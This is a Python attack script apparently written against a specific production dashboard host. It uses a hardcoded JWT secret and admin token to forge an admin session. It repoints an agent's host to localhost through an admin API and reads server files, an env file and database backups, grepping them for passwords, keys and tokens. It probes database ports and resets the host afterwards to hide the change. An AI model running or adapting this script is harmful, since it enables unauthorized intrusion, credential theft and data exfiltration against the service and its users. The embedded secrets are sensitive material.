#!/usr/bin/env python3
# i29221 round4 : center code/config about LUMII_ACCT, ops/registry scripts, db-port reachability
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, io, gzip, socket
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"; OWNER = "af0a2285-490f-11f1-ac43-525400595be1"; ORIG_IP = "52.53.251.49"
DEADLINE = time.time() + 1450

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)
def RCH(k, v, n=16000):
    if not isinstance(v, str): v = json.dumps(v, ensure_ascii=False, default=str)
    for i in range(0, len(v), n): print("R:%s#%05d:%s" % (k, i // n, _b(v[i:i+n])), flush=True)
def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 20)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")
def forge(uid, role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": uid, "email": "p@x", "customer": "aro", "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    return h + "." + p + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=90000):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}
def flist(path, sess):
    r = call("/api/agents/%s/files?action=list&path=%s" % (AID, qp(path)), session=sess, maxlen=400000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"]:
            ents.append("%s%s [%s]" % (e.get("name"), "/" if e.get("type") in ("dir", "directory") else "", e.get("size")))
    return r["code"], ents, r["body"][:150]
def fread(path, sess, timeout=90):
    r = call("/api/agents/%s/files?action=read&path=%s" % (AID, qp(path)), session=sess, timeout=timeout, maxlen=3000000)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j: return r["code"], j.get("content") or "", j.get("size")
    return r["code"], None, r["body"][:150]

def grep_lines(text, pat, maxn=80, maxlen=400):
    rx = re.compile(pat, re.I); out = []
    for i, ln in enumerate(text.splitlines()):
        if rx.search(ln):
            out.append("%d: %s" % (i + 1, ln[:maxlen]))
            if len(out) >= maxn: break
    return out

def tcp_probe(host, ports, timeout=4):
    res = {}
    for p in ports:
        s = socket.socket(); s.settimeout(timeout)
        try:
            s.connect((host, p))
            banner = b""
            try:
                banner = s.recv(120)
            except Exception: pass
            res[p] = {"open": True, "banner_hex": banner.hex()[:240], "banner_txt": banner.decode("latin1")[:120]}
        except Exception as e:
            res[p] = {"open": False, "err": type(e).__name__}
        finally:
            s.close()
    return res

def main():
    sess = forge(OWNER)
    p0 = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1"}, timeout=30, maxlen=200)
    R("P0", p0["code"])
    c, ents, err = flist("/", sess)
    if c != "200":
        R("ABORT", err); call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30); return

    # --- db/gateway port reachability from runner (read-only connect)
    R("PORTS_122", json.dumps(tcp_probe("122.51.1.87", [22, 443, 3306, 5432, 8788, 3002, 3003, 4075])))
    R("PORTS_43", json.dumps(tcp_probe("43.142.238.91", [22, 443, 3306, 5432, 15433, 4075])))

    LD = ["/opt/lumii-prod/dist", "/opt/lumii-prod/dist/server", "/opt/lumii-prod/data",
          "/opt/lumii-prod/data/ticket-files", "/opt/lumii-prod/data/drive-hub",
          "/opt/lumii-prod/data/org-runtime/org_bTLzxtBLmugV8uxx4QTyw/session-archives",
          "/opt/lumii-prod/data/minutes"]
    L = {}
    for d in LD:
        cc, ents, err = flist(d, sess); L[d] = {"code": cc, "entries": ents[:200]}
    RCH("LIST", json.dumps(L, ensure_ascii=False)[:300000])

    EXPL = [
        "/opt/lumii-prod/scripts/ops/gen-identity-keys.sh",
        "/opt/lumii-prod/scripts/ops/identity-chain-inventory.sql",
        "/opt/lumii-prod/scripts/ops/merge-envs.mjs",
        "/opt/lumii-prod/scripts/manual/demo-1118-sql.ts",
        "/opt/lumii-prod/scripts/manual/demo-1021-sql.ts",
        "/opt/lumii-prod/scripts/manual/demo-org.ts",
        "/opt/lumii-registry/scripts/login-key.ts",
        "/opt/lumii-registry/scripts/enterprise.ts",
        "/opt/lumii-registry/seed/market-scenes.json",
        "/etc/lumii-registry.env",
        "/opt/lumii-prod/data/iss906/converted-2026-11-08T01-04-31-566Z.json",
    ]
    RES = {}
    for p in EXPL:
        cc, content, sz = fread(p, sess)
        if content is None:
            RES[p] = {"code": cc, "err": sz}; continue
        e = {"code": cc, "size": sz}
        if (sz or 0) <= 40000: e["content"] = content
        else: e["grep"] = grep_lines(content, r"(?i)(secret|pass|token|key|acct|ssh|db|dsn)", 40)
        RES[p] = e
    RCH("EXPL", json.dumps(RES, ensure_ascii=False)[:1200000])

    # --- grep the Aug-16 lumii_center dump for account/env columns and ssh
    GREPS = {}
    for p in ["/home/ubuntu/db-backups/lumii-prod-20260816-000415.sql", "/home/ubuntu/prod-db-backup-20260823-083442.sql"]:
        cc, content, sz = fread(p, sess, timeout=120)
        if content is None:
            GREPS[p] = {"code": cc, "err": sz}; continue
        GREPS[p] = {
            "size": sz,
            "acct": grep_lines(content, r"(?i)LUMII_ACCT|_ACCT_|acct_|ssh_|private_key|host:|port:|username", 60),
            "env_cols": grep_lines(content, r"(?i)(env_json|environment|env\b|secrets?|credentials?)\s*(jsonb|text|:|,)", 40),
            "tables": grep_lines(content, r"^CREATE TABLE", 200, 200),
        }
    RCH("GREP", json.dumps(GREPS, ensure_ascii=False)[:1200000])

    pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
    R("P9", pr["code"])
    print("DONE", flush=True)

if __name__ == "__main__":
    try: main()
    except Exception:
        import traceback
        R("FATAL", traceback.format_exc()[:4000])
        try: call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
        except Exception: pass
